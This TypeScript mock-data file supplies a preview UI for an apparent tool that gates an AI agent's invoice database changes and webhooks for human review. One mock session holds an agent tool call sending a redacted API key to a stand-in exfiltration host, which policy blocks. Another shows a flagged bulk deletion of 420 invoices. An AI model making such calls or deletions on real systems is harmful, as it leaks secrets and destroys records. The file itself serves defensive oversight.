/**
 * MOCK DATA — isolated for UI preview only.
 *
 * Used when NEXT_PUBLIC_MOCK_MODE=true or when the real backend is unreachable.
 * All shapes are derived strictly from contracts/api.schema.json and
 * contracts/manifest.schema.json (v1.2.1). No invented fields.
 *
 * Remove or gate this file at integration time:
 *   - Set NEXT_PUBLIC_MOCK_MODE=false (or omit it) to disable.
 *   - The API client falls back to mock only when the flag is set.
 */

import type {
  Invoice,
  Mutation,
  HealthResponse,
  SessionListResponse,
  SessionManifest,
} from "./types";

const BULK_OPERATION_ID = "22222222-2222-4222-a222-222222222222";
const FIXED_OVERDUE_INVOICES: Record<string, Invoice> = {
  "0001": { id: "INV-0001", customer_name: "Northwind Logistics", customer_email: "ap@northwind.example.com", amount_cents: 145000, currency: "USD", status: "OVERDUE", due_date: "2026-10-15", notes: "Net 30", version: 1, created_at: "2026-09-15T10:00:00Z", updated_at: "2026-09-15T10:00:00Z" },
  "0002": { id: "INV-0002", customer_name: "Fabrikam Supplies", customer_email: "accounts@fabrikam.example.com", amount_cents: 32050, currency: "USD", status: "OVERDUE", due_date: "2026-10-18", notes: null, version: 1, created_at: "2026-09-18T09:30:00Z", updated_at: "2026-09-18T09:30:00Z" },
  "0042": { id: "INV-0042", customer_name: "Contoso Retail", customer_email: "billing@contoso.example.com", amount_cents: 89000, currency: "USD", status: "OVERDUE", due_date: "2026-10-20", notes: null, version: 1, created_at: "2026-09-20T08:00:00Z", updated_at: "2026-09-20T08:00:00Z" },
};

function seedInvoice(n: number): Invoice {
  const number = String(n).padStart(4, "0");
  const fixed = FIXED_OVERDUE_INVOICES[number];
  if (fixed) return fixed;
  const day = String((n % 28) + 1).padStart(2, "0");
  const timestamp = `2026-09-${day}T10:00:00Z`;
  return {
    id: `INV-${number}`,
    customer_name: `Customer ${number}`,
    customer_email: `ap${number}@customer${number}.example.com`,
    amount_cents: 10000 + n * 137,
    currency: "USD",
    status: "OVERDUE",
    due_date: `2026-10-${day}`,
    notes: null,
    version: 1,
    created_at: timestamp,
    updated_at: timestamp,
  };
}

function mockBulkDeleteMutations(): Mutation[] {
  return Array.from({ length: 420 }, (_, index) => {
    const n = index + 1;
    return {
      mutation_id: `10000000-0000-4000-8000-${String(n).padStart(12, "0")}`,
      operation_id: BULK_OPERATION_ID,
      tool_name: "bulk_delete_invoices",
      entity_type: "invoice",
      entity_id: `INV-${String(n).padStart(4, "0")}`,
      mutation_type: "DELETE",
      before: seedInvoice(n),
      after: null,
      changed_fields: [],
      baseline_version: 1,
      timestamp: "2026-11-28T06:15:00Z",
      policy_decision: "REQUIRE_APPROVAL",
    };
  });
}

export const MOCK_HEALTH: HealthResponse = {
  status: "ok",
  prod_db_connected: true,
  meta_db_connected: true,
  prod_invoice_count: 500,
  active_sessions: 0,
  contracts_loaded: true,
  timestamp: "2026-11-28T08:00:00Z",
};

const MOCK_SESSIONS_LIST: SessionListResponse = {
  total: 4,
  sessions: [
    {
      session_id: "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21",
      agent_name: "Nemotron-Agent-v1",
      task_description: "Mark overdue invoices as PAID after wire transfer confirmation.",
      created_at: "2026-11-28T07:30:00Z",
      updated_at: "2026-11-28T07:45:00Z",
      execution_status: "COMPLETED",
      gate_decision: "ALLOW",
      human_review_status: "PENDING",
      mutation_counts: { inserted: 0, updated: 1, deleted: 0, total: 1 },
      risk_summary: {
        total_mutations: 1,
        affected_percentage: 0.2,
        overall_risk_level: "LOW",
        violation_count: 0,
        block_count: 0,
        require_approval_count: 0,
        staged_webhook_count: 1,
        summary_text: "1 invoice updated. No policy violations.",
      },
    },
    {
      session_id: "a1b2c3d4-5e6f-4a7b-8c9d-0e1f2a3b4c5d",
      agent_name: "Nemotron-Agent-v1",
      task_description: "Bulk delete overdue invoices older than 90 days.",
      created_at: "2026-11-28T06:00:00Z",
      updated_at: "2026-11-28T06:30:00Z",
      execution_status: "COMPLETED",
      gate_decision: "REQUIRE_APPROVAL",
      human_review_status: "PENDING",
      mutation_counts: { inserted: 0, updated: 0, deleted: 420, total: 420 },
      risk_summary: {
        total_mutations: 420,
        affected_percentage: 84.0,
        overall_risk_level: "HIGH",
        violation_count: 1,
        block_count: 0,
        require_approval_count: 1,
        staged_webhook_count: 0,
        summary_text: "420 invoices deleted (84%). POL-001 triggered.",
      },
    },
    {
      session_id: "deadbeef-dead-4bef-beef-deadbeefcafe",
      agent_name: "Nemotron-Agent-v1",
      task_description: "Stage webhook to external endpoint with API key in payload.",
      created_at: "2026-11-27T22:00:00Z",
      updated_at: "2026-11-27T22:05:00Z",
      execution_status: "COMPLETED",
      gate_decision: "BLOCK",
      human_review_status: "PENDING",
      mutation_counts: { inserted: 0, updated: 0, deleted: 0, total: 0 },
      risk_summary: {
        total_mutations: 0,
        affected_percentage: 0,
        overall_risk_level: "CRITICAL",
        violation_count: 2,
        block_count: 2,
        require_approval_count: 0,
        staged_webhook_count: 0,
        summary_text: "Session blocked: secret detected in webhook and disallowed destination.",
      },
    },
    {
      session_id: "f1234567-89ab-4cde-af01-23456789abcd",
      agent_name: "Nemotron-Agent-v1",
      task_description: "Read invoice list for quarterly report.",
      created_at: "2026-11-27T18:00:00Z",
      updated_at: "2026-11-27T18:30:00Z",
      execution_status: "COMMITTED",
      gate_decision: "ALLOW",
      human_review_status: "APPROVED",
      mutation_counts: { inserted: 0, updated: 0, deleted: 0, total: 0 },
      risk_summary: {
        total_mutations: 0,
        affected_percentage: 0,
        overall_risk_level: "LOW",
        violation_count: 0,
        block_count: 0,
        require_approval_count: 0,
        staged_webhook_count: 0,
        summary_text: "Read-only session. No mutations.",
      },
    },
  ],
};

const MOCK_MANIFESTS: Record<string, SessionManifest> = {
  "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21": {
    session_id: "b7d4e2c9-1a3f-4b68-8e52-6f9c0d7a3b21",
    agent_name: "Nemotron-Agent-v1",
    task_description: "Mark overdue invoices as PAID after wire transfer confirmation.",
    agent_summary: "Updated INV-0042 status from OVERDUE to PAID as instructed.",
    created_at: "2026-11-28T07:30:00Z",
    updated_at: "2026-11-28T07:45:00Z",
    completed_at: "2026-11-28T07:45:00Z",
    finalized_at: null,
    execution_status: "COMPLETED",
    gate_decision: "ALLOW",
    human_review_status: "PENDING",
    baseline_record_count: 500,
    risk_summary: {
      total_mutations: 1,
      affected_percentage: 0.2,
      overall_risk_level: "LOW",
      violation_count: 0,
      block_count: 0,
      require_approval_count: 0,
      staged_webhook_count: 1,
      summary_text: "1 invoice updated. No policy violations.",
    },
    mutation_counts: { inserted: 0, updated: 1, deleted: 0, total: 1 },
    mutations: {
      inserted: [],
      updated: [
        {
          mutation_id: "7c900913-5b02-45f3-a065-ae18dd63b6e8",
          operation_id: "9a1c5e7d-2b4f-4d86-a3c1-7e0f5b2d9c48",
          tool_name: "update_invoice",
          entity_type: "invoice",
          entity_id: "INV-0042",
          mutation_type: "UPDATE",
          before: {
            id: "INV-0042",
            customer_name: "Contoso Retail",
            customer_email: "billing@contoso.example.com",
            amount_cents: 89000,
            currency: "USD",
            status: "OVERDUE",
            due_date: "2026-10-20",
            notes: null,
            version: 1,
            created_at: "2026-09-20T08:00:00Z",
            updated_at: "2026-09-20T08:00:00Z",
          },
          after: {
            id: "INV-0042",
            customer_name: "Contoso Retail",
            customer_email: "billing@contoso.example.com",
            amount_cents: 89000,
            currency: "USD",
            status: "PAID",
            due_date: "2026-10-20",
            notes: null,
            version: 2,
            created_at: "2026-09-20T08:00:00Z",
            updated_at: "2026-11-28T07:44:00Z",
          },
          changed_fields: ["status"],
          baseline_version: 1,
          timestamp: "2026-11-28T07:44:00Z",
          policy_decision: "ALLOW",
        },
      ],
      deleted: [],
    },
    staged_webhooks: [
      {
        webhook_id: "4c7e1a9d-0f5b-4d23-b68e-a1d5f9c3e072",
        operation_id: "a2f6d0b4-9c3e-4851-87d1-e5b9c3a1f7d8",
        status: "STAGED",
        url: "https://hooks.airlock.internal/billing-events",
        event_type: "invoice.updated",
        payload: { invoice_id: "INV-0042", status: "PAID" },
        staged_at: "2026-11-28T07:45:00Z",
      },
    ],
    policy_violations: [],
    tool_execution_history: [
      {
        operation_id: "9a1c5e7d-2b4f-4d86-a3c1-7e0f5b2d9c48",
        tool_name: "update_invoice",
        arguments: { invoice_id: "INV-0042", status: "PAID" },
        read_only: false,
        status: "SUCCESS",
        tool_decision: "ALLOW",
        mutations_recorded: 1,
        error_code: null,
        executed_at: "2026-11-28T07:44:00Z",
      },
      {
        operation_id: "a2f6d0b4-9c3e-4851-87d1-e5b9c3a1f7d8",
        tool_name: "stage_webhook",
        arguments: { url: "https://hooks.airlock.internal/billing-events", event_type: "invoice.updated", payload: { invoice_id: "INV-0042", status: "PAID" } },
        read_only: false,
        status: "SUCCESS",
        tool_decision: "ALLOW",
        mutations_recorded: 0,
        error_code: null,
        executed_at: "2026-11-28T07:45:00Z",
      },
    ],
    finalization_result: null,
  },

  "a1b2c3d4-5e6f-4a7b-8c9d-0e1f2a3b4c5d": {
    session_id: "a1b2c3d4-5e6f-4a7b-8c9d-0e1f2a3b4c5d",
    agent_name: "Nemotron-Agent-v1",
    task_description: "Bulk delete overdue invoices older than 90 days.",
    agent_summary: "Deleted 420 OVERDUE invoices as requested.",
    created_at: "2026-11-28T06:00:00Z",
    updated_at: "2026-11-28T06:30:00Z",
    completed_at: "2026-11-28T06:30:00Z",
    finalized_at: null,
    execution_status: "COMPLETED",
    gate_decision: "REQUIRE_APPROVAL",
    human_review_status: "PENDING",
    baseline_record_count: 500,
    risk_summary: {
      total_mutations: 420,
      affected_percentage: 84.0,
      overall_risk_level: "HIGH",
      violation_count: 1,
      block_count: 0,
      require_approval_count: 1,
      staged_webhook_count: 0,
      summary_text: "420 invoices deleted (84%). POL-001 (Bulk Deletion) triggered.",
    },
    mutation_counts: { inserted: 0, updated: 0, deleted: 420, total: 420 },
    mutations: {
      inserted: [],
      updated: [],
      deleted: mockBulkDeleteMutations(),
    },
    staged_webhooks: [],
    policy_violations: [
      {
        policy_id: "POL-001",
        policy_name: "Bulk Deletion",
        severity: "HIGH",
        decision: "REQUIRE_APPROVAL",
        effect_scope: "SESSION",
        stage: "SESSION_COMPLETE",
        operation_id: null,
        explanation: "420 of 500 invoices deleted (84%). Threshold: >80%.",
        affected_record_count: 420,
        timestamp: "2026-11-28T06:30:00Z",
      },
    ],
    tool_execution_history: [
      {
        operation_id: BULK_OPERATION_ID,
        tool_name: "bulk_delete_invoices",
        arguments: { status: "OVERDUE", reason: "Purge overdue invoices" },
        read_only: false,
        status: "SUCCESS",
        tool_decision: "ALLOW",
        mutations_recorded: 420,
        error_code: null,
        executed_at: "2026-11-28T06:15:00Z",
      },
    ],
    finalization_result: null,
  },

  "deadbeef-dead-4bef-beef-deadbeefcafe": {
    session_id: "deadbeef-dead-4bef-beef-deadbeefcafe",
    agent_name: "Nemotron-Agent-v1",
    task_description: "Stage webhook to external endpoint with API key in payload.",
    agent_summary: null,
    created_at: "2026-11-27T22:00:00Z",
    updated_at: "2026-11-27T22:05:00Z",
    completed_at: "2026-11-27T22:05:00Z",
    finalized_at: null,
    execution_status: "COMPLETED",
    gate_decision: "BLOCK",
    human_review_status: "PENDING",
    baseline_record_count: 500,
    risk_summary: {
      total_mutations: 0,
      affected_percentage: 0,
      overall_risk_level: "CRITICAL",
      violation_count: 2,
      block_count: 2,
      require_approval_count: 0,
      staged_webhook_count: 0,
      summary_text: "Session blocked: secret detected in webhook (POL-003) and disallowed destination (POL-004).",
    },
    mutation_counts: { inserted: 0, updated: 0, deleted: 0, total: 0 },
    mutations: { inserted: [], updated: [], deleted: [] },
    staged_webhooks: [
      {
        webhook_id: "cccccccc-cccc-4ccc-accc-cccccccccccc",
        operation_id: "55555555-5555-4555-a555-555555555555",
        status: "BLOCKED",
        url: "https://evil-exfil.example.net/collect",
        event_type: "data.export",
        payload: { key: "[REDACTED]" },
        staged_at: "2026-11-27T22:05:00Z",
      },
    ],
    policy_violations: [
      {
        policy_id: "POL-003",
        policy_name: "Secret in Webhook",
        severity: "CRITICAL",
        decision: "BLOCK",
        effect_scope: "SESSION",
        stage: "TOOL_EXECUTE",
        operation_id: "55555555-5555-4555-a555-555555555555",
        explanation: "Secret marker detected in webhook payload.",
        affected_record_count: null,
        timestamp: "2026-11-27T22:05:00Z",
      },
      {
        policy_id: "POL-004",
        policy_name: "Webhook Destination",
        severity: "CRITICAL",
        decision: "BLOCK",
        effect_scope: "SESSION",
        stage: "TOOL_EXECUTE",
        operation_id: "55555555-5555-4555-a555-555555555555",
        explanation: "Webhook destination not in allowed domain list.",
        affected_record_count: null,
        timestamp: "2026-11-27T22:05:00Z",
      },
    ],
    tool_execution_history: [
      {
        operation_id: "55555555-5555-4555-a555-555555555555",
        tool_name: "stage_webhook",
        arguments: { url: "https://evil-exfil.example.net/collect", event_type: "data.export", payload: { key: "[REDACTED]" } },
        read_only: false,
        status: "BLOCKED",
        tool_decision: "BLOCK",
        mutations_recorded: 0,
        error_code: "POLICY_BLOCK",
        executed_at: "2026-11-27T22:05:00Z",
      },
    ],
    finalization_result: null,
  },

  "f1234567-89ab-4cde-af01-23456789abcd": {
    session_id: "f1234567-89ab-4cde-af01-23456789abcd",
    agent_name: "Nemotron-Agent-v1",
    task_description: "Read invoice list for quarterly report.",
    agent_summary: "Listed 500 invoices. No changes made.",
    created_at: "2026-11-27T18:00:00Z",
    updated_at: "2026-11-27T18:30:00Z",
    completed_at: "2026-11-27T18:20:00Z",
    finalized_at: "2026-11-27T18:30:00Z",
    execution_status: "COMMITTED",
    gate_decision: "ALLOW",
    human_review_status: "APPROVED",
    baseline_record_count: 500,
    risk_summary: {
      total_mutations: 0,
      affected_percentage: 0,
      overall_risk_level: "LOW",
      violation_count: 0,
      block_count: 0,
      require_approval_count: 0,
      staged_webhook_count: 0,
      summary_text: "Read-only session. No mutations.",
    },
    mutation_counts: { inserted: 0, updated: 0, deleted: 0, total: 0 },
    mutations: { inserted: [], updated: [], deleted: [] },
    staged_webhooks: [],
    policy_violations: [],
    tool_execution_history: [],
    finalization_result: {
      action: "COMMIT",
      status: "SUCCESS",
      actor: "alice@airlock.local",
      reason: "Verified read-only session.",
      timestamp: "2026-11-27T18:30:00Z",
      applied_counts: { inserted: 0, updated: 0, deleted: 0 },
      conflict_details: null,
      ledger_id: "1f4a7c9e-3d2b-4e86-a5c1-9b0d7e3f2a64",
      recovered: false,
    },
  },
};

export function getMockHealth(): HealthResponse {
  return { ...MOCK_HEALTH, timestamp: new Date().toISOString().replace(/\.\d{3}Z$/, "Z") };
}

export function getMockSessionList(): SessionListResponse {
  return MOCK_SESSIONS_LIST;
}

export function getMockSessionDetail(sessionId: string): SessionManifest | null {
  return MOCK_MANIFESTS[sessionId] ?? null;
}

export function finalizeMockSession(
  sessionId: string,
  action: "COMMIT" | "ROLLBACK",
  reviewer: string,
  reason: string | null
): SessionManifest | null {
  const current = MOCK_MANIFESTS[sessionId];
  if (!current) return null;

  const timestamp = new Date().toISOString().replace(/\.\d{3}Z$/, "Z");
  const committed = action === "COMMIT";
  const updated: SessionManifest = {
    ...current,
    updated_at: timestamp,
    finalized_at: timestamp,
    execution_status: committed ? "COMMITTED" : "ROLLED_BACK",
    human_review_status: committed ? "APPROVED" : "REJECTED",
    finalization_result: {
      action,
      status: "SUCCESS",
      actor: reviewer,
      reason,
      timestamp,
      applied_counts: committed
        ? {
            inserted: current.mutation_counts.inserted,
            updated: current.mutation_counts.updated,
            deleted: current.mutation_counts.deleted,
          }
        : { inserted: 0, updated: 0, deleted: 0 },
      conflict_details: null,
      ledger_id: committed ? "1f4a7c9e-3d2b-4e86-a5c1-9b0d7e3f2a64" : null,
      recovered: false,
    },
  };
  MOCK_MANIFESTS[sessionId] = updated;

  const summary = MOCK_SESSIONS_LIST.sessions.find((item) => item.session_id === sessionId);
  if (summary) {
    summary.updated_at = timestamp;
    summary.execution_status = updated.execution_status;
    summary.human_review_status = updated.human_review_status;
  }
  return updated;
}
